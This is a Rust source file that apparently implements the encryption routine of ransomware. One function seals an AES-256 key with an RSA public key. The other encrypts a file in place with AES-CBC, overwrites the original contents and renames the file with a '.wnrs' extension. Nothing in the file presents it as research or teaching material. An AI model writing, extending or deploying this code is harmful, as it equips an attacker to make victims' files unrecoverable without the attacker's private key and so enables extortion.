use aes::Aes256;
use cbc::Encryptor;
use cipher::generic_array::GenericArray;
use cipher::{block_padding::Pkcs7, BlockEncryptMut, KeyIvInit};
use rand::RngCore;
use rsa::rand_core::OsRng;
use rsa::{Oaep, RsaPublicKey};
use sha2::Sha256;
use std::{
    error::Error,
    fs::{self, File, OpenOptions},
    io::{Read, Write},
    path::PathBuf,
};

pub fn encrypt_aes_key(
    aes_key: &[u8],
    public_key: &RsaPublicKey,
) -> Result<Vec<u8>, Box<dyn Error>> {
    let mut rng = OsRng;
    let padding = Oaep::new::<Sha256>();
    let encrypted_aes_key = public_key.encrypt(&mut rng, padding, aes_key)?;
    Ok(encrypted_aes_key)
}

pub fn encrypt_file(file_path: &PathBuf, aes_key: &[u8]) -> Result<(), Box<dyn Error>> {
    if aes_key.len() != 32 {
        return Err("Key must be exactly 32 bytes for AES-256".into());
    }

    let mut file = File::open(file_path)?;
    let mut plaintext = Vec::new();
    file.read_to_end(&mut plaintext)?;

    let mut iv = [0u8; 16];
    rand::rng().fill_bytes(&mut iv);

    let key = GenericArray::clone_from_slice(aes_key);
    let iv = GenericArray::from_slice(&iv);
    let encryptor = Encryptor::<Aes256>::new(&key, iv);

    let mut buf = plaintext.clone();
    let buf_len = buf.len();
    buf.resize(buf_len + 16, 0);

    let ciphertext = encryptor
        .encrypt_padded_mut::<Pkcs7>(&mut buf, buf_len)
        .map_err(|e| e.to_string())?;

    let mut out_file = OpenOptions::new()
        .write(true)
        .truncate(true)
        .open(file_path)?;
    out_file.write_all(iv.as_slice())?;
    out_file.write_all(ciphertext)?;

    fs::rename(file_path, file_path.with_extension("wnrs"))?;
    println!("🔒 File encrypted: {file_path:?}");

    Ok(())
}
